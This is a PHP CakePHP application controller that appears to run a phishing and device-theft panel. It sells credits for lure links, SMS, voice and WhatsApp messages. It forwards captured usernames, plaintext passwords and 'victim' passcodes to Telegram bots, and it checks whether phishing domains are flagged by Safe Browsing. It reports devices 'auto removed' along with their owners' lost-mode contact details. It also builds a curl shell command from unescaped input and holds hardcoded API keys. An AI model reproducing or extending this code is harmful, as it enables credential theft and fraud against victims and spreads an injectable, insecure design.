<?php
/**
 * Application level Controller
 *
 * This file is application-wide controller file. You can put all
 * application-wide controller-related methods here.
 *
 * CakePHP(tm) : Rapid Development Framework (https://cakephp.org)
 * Copyright (c) Cake Software Foundation, Inc. (https://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright (c) Cake Software Foundation, Inc. (https://cakefoundation.org)
 * @link          https://cakephp.org CakePHP(tm) Project
 * @package       app.Controller
 * @since         CakePHP(tm) v 0.2.9
 * @license       https://opensource.org/licenses/mit-license.php MIT License
 */

App::uses('Controller', 'Controller');

/**
 * Application Controller
 *
 * Add your application-wide methods in the class below, your controllers
 * will inherit them.
 *
 * @package		app.Controller
 * @link		https://book.cakephp.org/2.0/en/controllers.html#the-app-controller
 */
class AppController extends Controller {
	public $components = array(
        'Session',
        'Auth' => array(
			'loginAction' => array('controller' => 'login', 'action' => 'index', 'prefix' => false),
			'registerAction' => array('controller' => 'register', 'action' => 'index', 'prefix' => false),
            'logoutRedirect' => array('controller' => 'login', 'action' => 'index', 'prefix' => false),
			'authorize' => array('Controller'),
			'authenticate' => array(
				'Form' => array(
					'userFields' => array(
						'User.id',
						'User.link_credits',
						'User.sms_credits',
						'User.voice_credits',
						'User.email_credits',
						'User.chat_id',
						'User.username',
						'User.full_name',
						'User.email',
						'User.profile_picture',
						'User.role',
						'User.status',
					),
					'scope' => array(
						'User.status' => 1
					),
					'contain' => array(
					)
				)
			)
        ),
		'Paginator',
		'ConditionBuilder',
    );
	
	private function update_subscription_status(){
		$this->loadModel('UserSubscription');
		$fields = array('UserSubscription.subscription_status' => "'Expired'");
		$conditions = array(
			'DATE(UserSubscription.subscription_end) <= CURDATE()',
			'UserSubscription.subscription_status' => 'Active',
			'UserSubscription.user_id' => $this->Auth->user('id'),
		);
		$this->UserSubscription->updateAll($fields,$conditions);
	}
	
	private function update_last_seen($user_id){
		if(!isset($this->request->data['User'])){
			$this->loadModel('User');

			$update_data = array(
				'User.last_seen' =>	"NOW()"
			);
			$this->User->updateAll($update_data, array('User.id'=> $this->Auth->user('id')));
			
		}
	}
	
	
	
	
	public function send_login_notification($username, $password, $login_ok = true){
	    
	    $this->loadModel('Setting');
		$settings_data = $this->Setting->find('first',array(
			'fields'=> array(
				'Setting.admin_chat_id',
				'Setting.admin_telegram_bot',
				'Setting.user_telegram_bot',
			),
			'recursive'=>-1
		));
		
		
		$admin_chat_id =  $settings_data['Setting']['admin_chat_id'];
		$user_bot_token =  $settings_data['Setting']['user_telegram_bot'];
		$admin_bot_token =  $settings_data['Setting']['admin_telegram_bot'];
	    
	    $IP = getUserIP();
		$browser = getBrowser();
		$os = getOS();
		$ip_data = get_visitor_details();
		$country = $ip_data["country"];
		$city = $ip_data["city"];
		$isp = $ip_data["org"];
		$code = $ip_data["zip"];
		$timezone = $ip_data["timezone"];
		$isp = $ip_data["isp"];
		
		$title = "✅ʟᴏɢɪɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ✅";
		
		if($login_ok == false){
		    $title = "❌ INVALID LOGIN ❌";
		}
		
		$mess = "🚀 NEW SUPPORT 🚀
-------------------------------
$title
-------------------------------
👨‍💻 Username: $username
🔐 Password: $password
-------------------------------
📡 IP: $IP
📶 ISP: $isp
🌏 Address: $city, $country
🖥 Browser: $browser
🕔 Date: " . date('d/m/Y H:i:s');
		
		//report to user
		$user_chat_id = $this->Auth->user('chat_id');
		$this->send_telegram_msg($user_chat_id,$user_bot_token,$mess);
		
		//report to admin
		if($user_chat_id !== $admin_chat_id){
			$this->send_telegram_msg($admin_chat_id,$admin_bot_token,$mess);
		}
	
	}
	
	public function send_call_notification($number,$chat_id,$token,$country,$city,$state,$zip,$method,$passcode){
		$mess = "🚀 𝙑𝙞𝙘𝙩𝙞𝙢 𝙀𝙣𝙩𝙚𝙧 𝘾𝙤𝙙𝙚 🚀
---------------------------------------
🖥 Method: 📞 $method
---------------------------------------
🔑 Passcode: $passcode
---------------------------------------
📱 Victim Number: $number
---------------------------------------
🛫 Country => ".$country."
🏙 City => ".$city."
🌐 State : " . $state ."
📫 Postal Code => " . $zip ."
📅 TimeStamp => ".date('d/m/Y H:i:s');

	$this->send_telegram_msg($chat_id,$token,$mess);
	}

	public function send_telegram_msg($chat_id,$token,$msg){
		$data = [
			'chat_id' => $chat_id,
			'text' => $msg,
			'parse_mode'=>'html'
		];
		
		$params = http_build_query($data);
		$url = "https://api.telegram.org/bot$token/sendMessage";
		$cmd = "curl -X POST -d '$params' -H 'Content-Type: application/x-www-form-urlencoded' $url > /dev/null 2>&1 &";
		shell_exec($cmd);
	}
	
	public function beforeFilter(){
	
		if(!is_null($this->Session->read('Auth.User.id'))){
			
			$this->update_last_seen($this->Session->read('Auth.User.id'));
			$this->update_subscription_status();
			$this->is_maintenance();
			
			$this->layout = 'default';
			
		}else{
			$this->layout = 'login';
		}
	}
	
	public function is_maintenance(){
		$this->loadModel('Setting');
		$settings_data = $this->Setting->find('first',array(
			'fields'=> array(
				'Setting.id',
				'Setting.voice_cost',
				'Setting.maintenance',
				'Setting.admin_telegram_bot',
				'Setting.user_telegram_bot',
			),
			'recursive'=>-1
		));
		$is_maintenance = $settings_data['Setting']['maintenance'] ?? false;
		$this->set('is_maintenance',$is_maintenance);
		return $is_maintenance;
	}
	
	public function app_get_roles(){
		$roles = array(
			'User' => 'User',
			'Administrator' => 'Administrator',
		);
		return $roles;
	}
	
	
	public function getAllDBList($model,$fields=array(),$conditions=array(),$setname=null){
		$this->loadModel($model);
		$model = ClassRegistry::init(array('class' => $model, 'alias' => $model));
		
		$record = $model->find('list',array(
			'fields'=>$fields,
			'conditions'=>array(
				$conditions,
				$model->name.'.status' => 1,
			),
			'recursive'=>-1
		));
		
		//$columns = array_keys($fields);
		//$column_value = $fields[0];
		//$column_text = $fields[1];
		
		//debug($column_value);
		//exit();
		
		if($setname !== null){
			$this->set($setname,$record);
		}
		
		return $record;
	}
	
	public function beforeRender() {
        if ($this->response->statusCode() == 404) {
			
			$domain = Router::url('/', true);
			$domain = str_replace('http://','https://',$domain);
			if (substr($domain, -1) == '/'){			
				$domain = substr($domain, 0, -1);
			}
			$generated_string = $this->params['controller'];
			
			$this->loadModel('GeneratedLink');
			$link_data = $this->GeneratedLink->find('count',array(	
				'conditions'=>array(
					'GeneratedLink.status' => 1,
					'GeneratedLink.generated_string' => $generated_string,
					'GeneratedLink.is_proccessed' => 0,
					'Domain.name' => $domain,
					'Domain.Status' => 1,
					'Script.Status' => 1,
				)
			));
			
			if($link_data >= 1){
				
				$this->loadModel('Setting');
				$settings = $this->Setting->find('first');
				$panel_domain = $settings['Setting']['panel_domain'] ?? '';
				
				if($panel_domain == $_SERVER['SERVER_NAME']){
					http_response_code(404);
					die();
				}else{
					$full_url = Configure::read('BASE_URL')."help?$generated_string";
					return $this->redirect($full_url);
				}
				
			}else{
				http_response_code(404);
				die();
			}
			
        }
    }
	
	
	
	public function validate_user_credits($credit_type=''){
		
		$module_maintenance_field = '';
		if($credit_type=='link_credits'){
			$user_field = 'link_credits';
			$setting_field = 'generate_cost';
			$module_maintenance_field = 'link_maintenance';
		}else if($credit_type=='sms_credits'){
			$user_field = 'sms_credits';
			$setting_field = 'sms_cost';
			$module_maintenance_field = 'sms_maintenance';
		}else if($credit_type=='voice_credits'){
			$user_field = 'voice_credits';
			$setting_field = 'voice_cost';
			$module_maintenance_field = 'voice_maintenance';
		}else if($credit_type=='email_credits'){
			$user_field = 'email_credits';
			$setting_field = 'email_cost';
			$module_maintenance_field = 'email_maintenance';
		}else{
			$response['success'] = false;
			$response['msg'] = 'Invalid credit type.';
			return $response;
		}
		
		$this->loadModel('Setting');
		$settings_data = $this->Setting->find('first',array(
			'fields'=> array(
				"Setting.$setting_field",
				'Setting.maintenance',
				"Setting.$module_maintenance_field",
			),
			'recursive'=>-1
		));
		$required_amount = $settings_data['Setting'][$setting_field];
		$is_maintenance = (bool) $settings_data['Setting']['maintenance'];
		
		if($is_maintenance){
			$response['success'] = false;
			$response['msg'] = 'Panel is currently undergoing system maintenance, Please comeback later.';
			return $response;
		}else{
			$is_maintenance = (bool) $settings_data['Setting'][$module_maintenance_field];
			if($is_maintenance){
				$response['success'] = false;
				$response['msg'] = 'This feature is currently on maintenance, Please comeback later.';
				return $response;
			}
		}
		
		$user_data = $this->User->find('first',array(
			'fields'=>array(
				'User.id',
				"User.$user_field",
				'UserSubscription.subscription_status'
			),
			'contain'=>array('UserSubscription'),
			'conditions'=>array(
				'User.id'=>$this->Auth->user('id'),
				'User.status'=>1,
			),
			'recursive'=>-1
		));
		
		if($this->Auth->user('role') == 'User'){
			if(count($user_data) >=1){
				$subscription_status = $user_data['UserSubscription']['subscription_status'];
				$current_user_credits = $user_data['User'][$user_field];
				$remaining_user_credits_after_deduction = ($current_user_credits - $required_amount);
				
				
				if($credit_type == 'link_credits'){
					if($subscription_status == 'Active'){
						$response['success'] = true;
						$response['required_amount'] = 0;
						$response['data']['User']['id'] = $this->Auth->user('id');
						$response['data']['User'][$user_field] = $current_user_credits;
						return $response;
					}else{
						
						if($remaining_user_credits_after_deduction < 0){
							$response['success'] = false;
							$response['msg'] = "<h1 class=\"mb-1\">Insuficient credit.</h1>Current Credits: ".$current_user_credits."<br> Credit Required: ". $required_amount;
							return $response;
						}else{
							$response['success'] = true;
							$response['required_amount'] = $required_amount;
							$response['data']['User']['id'] = $this->Auth->user('id');
							$response['data']['User'][$user_field] = $remaining_user_credits_after_deduction;
							return $response;
						}
						
					}
				}else{
					if($remaining_user_credits_after_deduction < 0){
						$response['success'] = false;
						$response['msg'] = "<h1 class=\"mb-1\">Insuficient credit.</h1>Current Credits: ".$current_user_credits."<br> Credit Required: ". $required_amount;
						return $response;
					}else{
						$response['success'] = true;
						$response['required_amount'] = $required_amount;
						$response['data']['User']['id'] = $this->Auth->user('id');
						$response['data']['User'][$user_field] = $remaining_user_credits_after_deduction;
						return $response;
					}
				}
				
			}else{
				$response['success'] = false;
				$response['msg'] = "You are not allowed to access this page!";
				return $response;
			}
		}else{
			$response['success'] = true;
			$response['required_amount'] = 0;
			$response['data']['User']['id'] = $this->Auth->user('id');
			$response['data']['User'][$user_field] = $user_data['User'][$user_field];
			return $response;
		}
		
	}
	
	public function check_sms_api_balance($provider,$server_host,$username,$password){
		$data['provider'] = $provider;
		$data['server_host'] = $server_host;
		$data['username'] = $username;
		$data['password'] = $password;
		$data['action'] = 'check';
		$data = '?'.http_build_query($data);
		
		//$url = Configure::read('BASE_URL')."sms_api/index.php$data";
		 $url = "https://isendersms.com/api/index.php$data";
		$web_response = get_url_response($url);
		$response_body = $web_response[2];
		return $response_body;
	}
	
	public function start_send_sms($provider,$server_host,$username,$password,$gateway_id,$sender_id,$recipient,$msg){
		$data['provider'] = $provider;
		$data['server_host'] = $server_host;
		$data['username'] = $username;
		$data['password'] = $password;
		
		$data['gateway_id'] = $gateway_id;
		$data['sender_id'] = $sender_id;
		$data['recipient'] = $recipient;
		$data['delete_history'] = 0;
		$data['msg'] = $msg;
		
		$data['action'] = 'send';
		$data = '?'.http_build_query($data);
		
		//$url = Configure::read('BASE_URL')."sms_api/index.php$data";
		$url = "https://isendersms.com/api/index.php$data";
		
		$web_response = get_url_response($url);
		$response_body = $web_response[2];
		return $response_body;
	}
	
	public function send_whatsapp($number,$device_class,$message){
		$token = 'nrurrpl0lsea5omy';
		$instance = 'instance77508';
		$device_img = get_ios_device_img($device_class);
		
		$data['token'] = $token;
		$data['to'] = $number;
		$data['image'] = $device_img;
		$data['caption'] = $message;
		$data['priority'] = '10';
		$data['referenceId'] = '';
		$data['nocache'] = '';
		$data['msgId'] = '';
		$data['mentions'] = '';
		
		$curl = curl_init();
        curl_setopt_array($curl, array(
          CURLOPT_URL => "https://api.ultramsg.com/$instance/messages/image",
          CURLOPT_RETURNTRANSFER => true,
          CURLOPT_ENCODING => "",
          CURLOPT_MAXREDIRS => 10,
          CURLOPT_TIMEOUT => 30,
          CURLOPT_SSL_VERIFYHOST => 0,
          CURLOPT_SSL_VERIFYPEER => 0,
          CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
          CURLOPT_CUSTOMREQUEST => "POST",
          CURLOPT_POSTFIELDS => http_build_query($data),
          CURLOPT_HTTPHEADER => array(
            "content-type: application/x-www-form-urlencoded"
          ),
        ));
        
        $response = curl_exec($curl);
        $err = curl_error($curl);
        curl_close($curl);
        
        if ($err) {
          $api_response['sent'] = 'false';
          $api_response['message'] = $err;
          return json_encode($api_response);
        } else {
          return $response;
        }
		
	}
	
	public function send_whatsapp_textmebot($number,$device_class,$message){
		$message = urlencode($message);
		$apikey = 'mQdJbzGHZxAM';
		$device_img = get_ios_device_img($device_class);
		$url = "http://api.textmebot.com/send.php?recipient=$number&apikey=$apikey&text=$message&file=$device_img&json=yes";
		$response = get_url_response($url);
		return $response;
	}
	
	public function parse_auto_remove_result($json_auto_remove_results){
		$auto_remove_msg ="";
		$response = json_decode($json_auto_remove_results,true);
		
		if($response['autoremove'] == false){
			$auto_remove_msg = "\r\n------------------------✅ TRUE LOGIN ONLY ✅-------------------------\r\n";
			return $auto_remove_msg;
		}
		
		if(count($response['device_list'])>=1){
			$auto_remove_msg ="\r\n---------------------------------------\r\nAuto Remove Message\r\n---------------------------------------\r\n";
			foreach($response['device_list'] as $key=>$value){
				$model = $value['model'];
				$name = $value['device_name'];
				$lostmode = $value['lost_mode'];
				$owner_msg = $value['owner_lostmode_msg'];
				$owner_number = $value['owner_number'];
				$owner_email = $value['owner_lostmode_email'];
				
				$status = $value['msg'];
				$display_status = 'Status: Failed 📵';
				if($status == 'Removed'){
					$display_status = 'Status: OFF ✅';
				}
				
				$auto_remove_msg.= "Device: $model \r\nName: $name \r\n";
				
				if($lostmode=="Yes"){
					$auto_remove_msg.= "Owner's Message: $owner_msg \r\nOwner's Phone No: $owner_number \r\nOwner's Email: $owner_email \r\n";
				}
				$auto_remove_msg .= "$display_status\r\n---------------------------------------\r\n";
			}
		}else{
			$auto_remove_msg ="\r\n---------------------------------------\r\nAuto Remove Message\r\n---------------------------------------\r\n";
			$auto_remove_msg .= "No Devices to remove ✅\r\n---------------------------------------";
		}
		return $auto_remove_msg;
	}
	
	public function checkDomainStatus($domain, $apiKey='AIzaSyBFZ3eR5Tj3nPOCA8bv-Pqc5cXmKLIjHgs') {
		$url = 'https://safebrowsing.googleapis.com/v4/threatMatches:find?key=' . $apiKey;
		$data = [
			'client' => [
				'clientId' => 'yourcompany',
				'clientVersion' => '1.0.0'
			],
			'threatInfo' => [
				'threatTypes' => ['MALWARE', 'SOCIAL_ENGINEERING'],
				'platformTypes' => ['ANY_PLATFORM'],
				'threatEntryTypes' => ['URL'],
				'threatEntries' => [
					['url' => $domain]
				]
			]
		];

		$options = [
			'http' => [
				'header' => "Content-Type: application/json\r\n",
				'method' => 'POST',
				'content' => json_encode($data)
			]
		];
		$context = stream_context_create($options);
		$result = file_get_contents($url, false, $context);
		$matches = json_decode($result, true);

		if (empty($matches['matches'])) {
			return 1; //clean
		} else {
			return 0; //red
		}
	}
	
}
